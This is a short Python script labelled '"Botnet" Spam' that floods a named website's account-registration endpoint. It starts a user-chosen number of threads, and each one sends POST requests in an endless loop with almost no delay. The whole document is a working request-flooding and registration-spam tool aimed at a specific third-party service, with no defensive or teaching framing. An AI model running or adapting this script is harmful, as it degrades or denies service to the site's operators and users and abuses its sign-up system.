import requests
import threading
from time import sleep
import random
print("\"Botnet\" Spam\n(will be delayed because of website response time)")
def send():
  while True:
    r = requests.post(f"https://ezfn.dev/api/account/register")
    sleep(0.01)
    print(f"[*] Sent request.")
threads = []
amt = int(input("[?] How many threads? > "))
for _ in range((amt+1)):
  t = threading.Thread(target=send, args=())
  threads.append(t)
c = 0
for t in threads:
  c+=1
  t.start()
  print(f"[*] Started thread {c}")